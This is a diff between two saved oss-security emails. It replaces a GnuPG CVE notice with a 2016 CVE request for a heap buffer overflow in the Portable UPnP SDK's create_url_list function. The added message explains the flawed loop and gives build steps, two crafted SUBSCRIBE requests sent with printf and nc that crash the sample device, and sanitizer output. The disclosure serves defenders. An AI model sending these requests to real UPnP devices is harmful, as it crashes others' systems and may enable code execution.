@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2121" "Thursday" "3" "September" "2020" "19:55:29" "+0200" "Wolfgang Frisch" "wolfgang.frisch@suse.com" "<a0e32c22-02fa-b01a-f26f-ce68563d9f9c@suse.com>" "57" "[oss-security] CVE-2020-25125: gnupg2: buffer overflow when importing a key with AEAD preferences" nil nil nil "9" "2020090317:55:29" "[oss-security] CVE-2020-25125: gnupg2: buffer overflow when importing a key with AEAD preferences" (number mark "U       wolfgang.fri Sep  3   57/2121  " thread-indent "\"[oss-security] CVE-2020-25125: gnupg2: buffer overflow when importing a key with AEAD preferences\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2020-25125: gnupg2: buffer overflow when importing a key with AEAD preferences" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["10182" "Tuesday" "6" "September" "2016" "23:56:33" "-0400" "Scott Tenaglia" "scott.tenaglia@invincea.com" "<CAJ+owFsAGn7MJt+DWtLSwMkUrEqGWj0X2To+De3UaU6DjYqQ-w@mail.gmail.com>" "230" "[oss-security] CVE Request - Portable UPnP SDK 1.6.19 through 1.8.x" nil nil nil "9" "2016090703:56:33" "[oss-security] CVE Request - Portable UPnP SDK 1.6.19 through 1.8.x" (number mark "U       scott.tenagl Sep  6  230/10182 " thread-indent "\"[oss-security] CVE Request - Portable UPnP SDK 1.6.19 through 1.8.x\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 15922 invoked by uid 550); 3 Sep 2020 18:49:56 -0000
+Received: (qmail 7896 invoked by uid 550); 7 Sep 2016 13:03:54 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,130 +12,262 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 15844 invoked from network); 3 Sep 2020 17:55:41 -0000
-X-Virus-Scanned: by amavisd-new at test-mx.suse.de
-To: oss-security@lists.openwall.com
-From: Wolfgang Frisch <wolfgang.frisch@suse.com>
-Autocrypt: addr=wolfgang.frisch@suse.com; keydata=
- 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
-Organization: SUSE Software Solutions Germany GmbH
-Message-ID: <a0e32c22-02fa-b01a-f26f-ce68563d9f9c@suse.com>
-Date: Thu, 3 Sep 2020 19:55:29 +0200
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101
- Thunderbird/68.11.0
+Received: (qmail 27921 invoked from network); 7 Sep 2016 03:56:46 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=invincea.com; s=google;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=N6xDouD45UUtJNnfZ60h+OD2gbHsuB+YOro2j589so0=;
+        b=kSPXriCIuPot1IpKW0RK3XVOP3YgGb5WAjOZeKxpng5RFKvewfgZJ3ng5xYjrW6vNW
+         JyoVLZMJnFCT6JDD2k/y6jZMKQJNL2ofeW2zeyI7MNXcqOnwTm/jjY5cGWR3CsZ5ktkj
+         nlOCRm54nZ8F36B93orKMVQV/ekoklZvSzshk=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20130820;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=N6xDouD45UUtJNnfZ60h+OD2gbHsuB+YOro2j589so0=;
+        b=SeNW1etWgxMNJ1Um/OM1b3UwubgJnj2afOvM5Hx5ubfvuW5+mLrMnC/r7ZgZ1ljfqd
+         CeIXzwasIpFXBbNIWeHI7KGec5DnaMJm1JCcUUjLO9kFdPmXTncdTwXeLRVsOI7aaaAW
+         cvCb5UcNxoJS9UXcKddIIVDbmjgN7xnkx6vW6sN7QrSdvX61JKEyp5AyfxKpbP26I7k2
+         /mfJd6GbvD4siyASm4XgyD6WTDZaYIOEqeuDzyVZc/subEDjjnx0H+1zbMU9OfATgsqH
+         Jr/F1b1SjLnpKT7mT4PvwNETAd49omFgWmx0WWZLEibmP+f/hnCm02ovb8QkJy9Hv/m3
+         7Z0Q==
+X-Gm-Message-State: AE9vXwM/AtTbi3GpRtv6J1IHcPPPNjIHPho56BwhRoJ0rBS9ZEVlChzcTuRNLOyvxYrQ+Z+cKT1Kci9XvwFCvHCk
+X-Received: by 10.176.2.10 with SMTP id 10mr16310918uas.79.1473220594080; Tue,
+ 06 Sep 2016 20:56:34 -0700 (PDT)
 MIME-Version: 1.0
-Content-Type: multipart/signed; micalg=pgp-sha256;
- protocol="application/pgp-signature";
- boundary="1XDRgys6p39do5awsqF0OcYAqdHlqfLLN"
-Subject: [oss-security] CVE-2020-25125: gnupg2: buffer overflow when importing a key with
- AEAD preferences
+From: Scott Tenaglia <scott.tenaglia@invincea.com>
+Date: Tue, 6 Sep 2016 23:56:33 -0400
+Message-ID: <CAJ+owFsAGn7MJt+DWtLSwMkUrEqGWj0X2To+De3UaU6DjYqQ-w@mail.gmail.com>
+To: oss-security@lists.openwall.com, cve-assign@mitre.org
+Content-Type: multipart/alternative; boundary=001a113d12fe2fb94f053be2e6aa
+Subject: [oss-security] CVE Request - Portable UPnP SDK 1.6.19 through 1.8.x
 
---1XDRgys6p39do5awsqF0OcYAqdHlqfLLN
-Content-Type: multipart/mixed; boundary="sDZUmijPgEswP3e0i28tqdq9mzQe0xF0N"
-
---sDZUmijPgEswP3e0i28tqdq9mzQe0xF0N
-Content-Type: text/plain; charset=utf-8
-Content-Language: en-US
+--001a113d12fe2fb94f053be2e6aa
+Content-Type: text/plain; charset=UTF-8
 Content-Transfer-Encoding: quoted-printable
 
-CVE-2020-25125 was assigned to the following issue in GnuPG:
+Portable UPnP SDK: https://sourceforge.net/projects/pupnp/
+Bug report: https://sourceforge.net/p/pupnp/bugs/133/
 
-> Importing an OpenPGP key having a preference list for AEAD algorithms
-> will lead to an array overflow and thus often to a crash or other
-> undefined behaviour.
+There is a heap buffer overflow vulnerability in the create_url_list
+function in upnp/src/gena/gena_device.c. I first discovered this
+vulnerability when working with version 1.6.19 and have confirmed that it
+also exists in the latest code on the master branch (1.8.x). At the very
+least a reliable denial of service condition can be created by crashing the
+program.
 
-> These versions are affected:
->=20
->  - GnuPG 2.2.21   (released 2020-07-09)
->  - GnuPG 2.2.22   (released 2020-08-27)
->  - Gpg4win 3.1.12 (released 2020-07-24)
+The problem in create_url_list starts in the following for-loop. The point
+of the loop is to parse the list of URIs enclosed in angled brackets (=E2=
+=80=98<=E2=80=98
+and =E2=80=98>=E2=80=99) in the CALLBACK header of a SUBSCRIBE request. If =
+the call to
+parse_uri() fails for any reason other than UPNP_E_OUTOF_MEMORY, or the
+hostport field of the parsed URI has a size of zero, then the URLcount
+variable will not be incremented. If 2 URIs are provided, with the first
+one being correctly formatted, and the second not, then URLcount will equal
+1 coming out of this loop.
 
-https://lists.gnupg.org/pipermail/gnupg-announce/2020q3/000448.html
+    for( i =3D 0; i < URLS->size; i++ ) {
+        if( ( URLS->buff[i] =3D=3D '<' ) && ( i + 1 < URLS->size ) ) {
+            if( ( ( return_code =3D parse_uri( &URLS->buff[i + 1],
+                                             URLS->size - i + 1,
+                                             &temp ) ) =3D=3D HTTP_SUCCESS )
+                && ( temp.hostport.text.size !=3D 0 ) ) {
+                URLcount++;
+            } else {
+                if( return_code =3D=3D UPNP_E_OUTOF_MEMORY ) {
+                    return return_code;
+                }
+            }
+        }
+    }
 
---=20
-Wolfgang Frisch <wolfgang.frisch@suse.com>
-Security Engineer
-OpenPGP fingerprint: A2E6 B7D4 53E9 544F BC13  D26B D9B3 56BD 4D4A 2D15
-SUSE Software Solutions Germany GmbH
-Maxfeldstr. 5, 90409 Nuremberg, Germany
-(HRB 36809, AG N=C3=BCrnberg)
-Managing Director: Felix Imend=C3=B6rffer
+The next bit of code (abbreviated for readability) is where the overflow
+actually occurs. The first conditional evaluates to true because URLcount
+is 1. Next, a buffer is allocated (out->URLs) to hold a copy of the
+original URI string. Then, an array of uri_type structs are allocated
+(out->parsedURLs) to hold details of each parsed URI. The size of this
+array is going to be 1, because URLcount is 1. The problem is that the
+for-loop then parses the *original* URI string again. In fact, the only
+real difference between this for-loop and the previous one is that the
+parsed URIs are stored at successive indexes in the parsedURLs array
+instead of a temporary variable. So when it gets to parsing the second URI
+it passes out->parsedURLs[2] to the parse_uri() function, which is an
+address passed the end of the allocated array. As parse_uri() populates
+values of the struct it is writing passed the end of the array.
 
+    if( URLcount > 0 ) {
+        out->URLs =3D malloc(URLS->size + 1);
+        out->parsedURLs =3D malloc(sizeof(uri_type) * URLcount);
+        // omitted for readability
+        memcpy( out->URLs, URLS->buff, URLS->size );
+        out->URLs[URLS->size] =3D 0;
+        URLcount =3D 0;
+        for( i =3D 0; i < URLS->size; i++ ) {
+            if( ( URLS->buff[i] =3D=3D '<' ) && ( i + 1 < URLS->size ) ) {
+                if( ( ( return_code =3D
+                        parse_uri( &out->URLs[i + 1], URLS->size - i + 1,
+                                   &out->parsedURLs[URLcount] ) ) =3D=3D
+                      HTTP_SUCCESS )
+                    && ( out->parsedURLs[URLcount].hostport.text.size !=3D
+                         0 ) ) {
+                    URLcount++;
+                } else {
+                    if( return_code =3D=3D UPNP_E_OUTOF_MEMORY ) {
+                        free( out->URLs );
+                        free( out->parsedURLs );
+                        out->URLs =3D NULL;
+                        out->parsedURLs =3D NULL;
+                        return return_code;
+                    }
+                }
+            }
+        }
+    }
 
---sDZUmijPgEswP3e0i28tqdq9mzQe0xF0N--
+Depending on the format of the malformed URI different things happen.
+Sometimes the overwrite has no noticeable impact, while other times it will
+crash the program. At the very least it is possible to create a reliable
+denial of service condition. It may also be possible to use this for remote
+code execution.
 
---1XDRgys6p39do5awsqF0OcYAqdHlqfLLN
-Content-Type: application/pgp-signature; name="signature.asc"
-Content-Description: OpenPGP digital signature
-Content-Disposition: attachment; filename="signature.asc"
+Below are the steps that I used to trigger the vulnerability on both
+version 1.6.19 and 1.8.0. They should be sufficient to recreate the issue.
 
------BEGIN PGP SIGNATURE-----
+First, compile for 32-bit with debugging enabled and an installation
+directory set. The reason for the setting the installation directory and
+compiling for 32-bits is so that =E2=80=9Cmake install=E2=80=9D results in =
+a single binary
+that is easy to debug.
 
-iQIzBAEBCAAdFiEEYqBDpiSp/H/7pxro7t22gcnlyyMFAl9RLhEACgkQ7t22gcnl
-yyOSiBAAwTIqCbnT8oAB5V66CU+6OYyY2lf+HCwPUTBCxfuBizTSnYCu+Uw8MQXO
-4LBGIVkYuVWoTYUXuC5WLYQrwmZX8oG6UjcUOxS1cNvm+P7sdzmZqWhssOF3yHli
-7FnMHdNwtnzQgGucQnFLHIYZ+Tz5klni7Yp8xQ8JlcIXAeqaFu+8WvK33pzTdOGF
-SQDMdY7d7bn7kp5ksjq7mXERtxYZj4o3BedaBgVn9df8OmLUQj2B6ZuziyqvDsW6
-njnbwut9y7AQ4bJ9+OVWh/6Bv62YqW9ZTITiXG1bHYrDqWOlRRNL3gb+bQz8BCIG
-7cEL6XxDwXJMQhUFSsXlFUpjMN/ZvQEs5qz0O4EJZhrk+TGoxuJZP3crVur8DGpe
-ymCCpIsl79qKRf8Ou9rCFKqx5HwJFxCbCIHFjPK1epByPq6KeVKpxb58LrSShuQd
-jbaK+RiHjk3rPQS/6PtlXx4OH4K+Fjn7EcWApSd5/CgCLijXBjGOSrOkkexsrwW9
-VhhMTwUM+RpGUi+8ctO7VyvypuXBxtDHQjh5tqn8xbxtuLrTsLdja2ZAy78BByMw
-xztkEvXRLFMsD8dddCxGfEf356QELe7RVmEtQU1QIPgMEkOvJTalUUOlzyPANUVO
-SpWpswMrsCsAdMyO/RAbI6R5WhuAJgjMr7dqK7xmiAHWpH4n8uQ=
-=6iW2
------END PGP SIGNATURE-----
+./configure --prefix=3D<install dir> --enable-debug --host=3Di686-linux-gnu
+CFLAGS=3D"-m32 -fno-omit-frame-pointer" LDFLAGS=3D-m32
+make clean;make install
 
---1XDRgys6p39do5awsqF0OcYAqdHlqfLLN--
+To setup the default sample, which emulates a TV device, do the following
+from the libupnp directory:
+cd upnp/sample
+mkdir tvdevice
+cp -r web tvdevice
+
+To run the sample change to the directory you just created and run the
+binary:
+cd tvdevice
+../.libs/tv_device
+
+With the sample running go to another terminal window. Enter the following
+to create a non-malicious subscription message:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153>\r\nNT: upnp:event\r\nTIMEOUT: Second-1801\r\n\r\n"
+| nc 127.0.0.1 49152
+
+One form of a malicious message will crash the application is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><http://a:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Another is:
+printf "SUBSCRIBE /upnp/event/tvcontrol1 HTTP/1.1\r\nHOST:
+0.0.0.0:49152\r\nCALLBACK:
+<http://127.0.0.1:49153><//:49153\r\nNT: upnp:event\r\nTIMEOUT:
+Second-1801\r\n\r\n" | nc 127.0.0.1 49152
+
+Below is the output of address sanitizer from either of the two requests
+above (add =E2=80=9C-fsanitize=3Daddress=E2=80=9D to CFLAGS  during configu=
+re).
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+=3D=3D13048=3D=3D ERROR: AddressSanitizer: heap-buffer-overflow on address
+0xeef07710 at pc 0xf698b0c3 bp 0xf1463998 sp 0xf1463988
+WRITE of size 4 at 0xeef07710 thread T8
+    #0 0xf698b0c2
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x460c2)
+    #1 0xf698cb13
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x47b13)
+    #2 0xf6992e1c
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4de1c)
+    #3 0xf6993bae
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4ebae)
+    #4 0xf69999f3
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x549f3)
+    #5 0xf6964b8f
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fb8f)
+    #6 0xf6964e58
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fe58)
+    #7 0xf693baa4
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x5aa4)
+    #8 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #9 0xf69f13bc (/usr/lib/libasan.so.0.0.0+0xa3bc)
+    #10 0xf68feb2b (/usr/lib/libpthread-2.17.so+0x6b2b)
+    #11 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+0xeef07710 is located 8 bytes to the right of 168-byte region
+[0xeef07660,0xeef07708)
+allocated by thread T8 here:
+    #0 0xf69fe45f (/usr/lib/libasan.so.0.0.0+0x1745f)
+    #1 0xf69928da
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4d8da)
+    #2 0xf6993bae
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x4ebae)
+    #3 0xf69999f3
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x549f3)
+    #4 0xf6964b8f
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fb8f)
+    #5 0xf6964e58
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x1fe58)
+    #6 0xf693baa4
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x5aa4)
+    #7 0xf6a02766 (/usr/lib/libasan.so.0.0.0+0x1b766)
+    #8 0xf683276d (/usr/lib/libc-2.17.so+0xf776d)
+Thread T8 created by T0 here:
+    #0 0xf69f12ca (/usr/lib/libasan.so.0.0.0+0xa2ca)
+    #1 0xf693be13
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x5e13)
+    #2 0xf693c882
+(/home/user/Downloads/pupnp-code/install/lib/libthreadutil.so.10.0.0+0x6882)
+    #3 0xf6967c74
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x22c74)
+    #4 0xf69a2aee
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x5daee)
+    #5 0xf69a2d2d
+(/home/user/Downloads/pupnp-code/install/lib/libupnp.so.10.0.0+0x5dd2d)
+    #6 0x804fc17
+(/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_device+0x804fc17)
+    #7 0x805056c
+(/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_device+0x805056c)
+    #8 0x8050631
+(/home/user/Downloads/pupnp-code/upnp/sample/.libs/tv_device+0x8050631)
+    #9 0xf6754942 (/usr/lib/libc-2.17.so+0x19942)
+Shadow bytes around the buggy address:
+  0x3dde0e90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ea0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0eb0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0ec0: fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00
+  0x3dde0ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+=3D>0x3dde0ee0: 00 fa[fa]fa fa fa fa fa fa fa 00 00 00 00 00 00
+  0x3dde0ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  0x3dde0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+  0x3dde0f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
+Shadow byte legend (one shadow byte represents 8 application bytes):
+  Addressable:           00
+  Partially addressable: 01 02 03 04 05 06 07
+  Heap left redzone:     fa
+  Heap righ redzone:     fb
+  Freed Heap region:     fd
+  Stack left redzone:    f1
+  Stack mid redzone:     f2
+  Stack right redzone:   f3
+  Stack partial redzone: f4
+  Stack after return:    f5
+  Stack use after scope: f8
+  Global redzone:        f9
+  Global init order:     f6
+  Poisoned by user:      f7
+  ASan internal:         fe
+=3D=3D13048=3D=3D ABORTING
+
+--001a113d12fe2fb94f053be2e6aa--
